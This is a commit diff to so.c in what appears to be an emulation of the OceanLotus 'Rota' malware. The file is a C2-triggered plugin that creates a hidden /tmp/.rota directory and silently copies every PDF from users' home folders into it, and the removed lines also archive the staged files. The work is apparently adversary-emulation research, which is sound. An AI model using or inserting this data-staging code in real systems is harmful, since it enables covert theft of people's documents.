bb43fb513e8c028293e3b73ec41215a58773f782
Jared Stroud <1250113+archcloudlabs@users.noreply.github.com>
2023-08-03 10:15:16 -0400

    adding features for data staging

--- ocean_lotus/rota/src/so.c
+++ ocean_lotus/rota/src/so.c
@@ -1,22 +1,19 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-// this is loaded via dlsym.
-// the argument to the rota_c2_run_plugin_1 command
-extern void update(void) {
-    create_dir();
-    copy_data();
-    stage_data();
-}
-
 void create_dir() {
     system("mkdir -p /tmp/.rota;");
 }
 
 void copy_pdfs() {
-    system("find /home/ -name \"*.pdf\" -exec cp {} /tmp/.rota/ \;");
+    system("find /home/ -name *.pdf -exec cp {} /tmp/.rota \\; 2>/dev/null");
 }
 
-void stage_data() {
-    system("cd /tmp/.rota; tar -czvf rota.tar.gz *");
+
+
+// this is loaded via dlsym.
+// the argument to the rota_c2_run_plugin_1 command
+extern void update(void) {
+    create_dir();
+    copy_pdfs();
 }
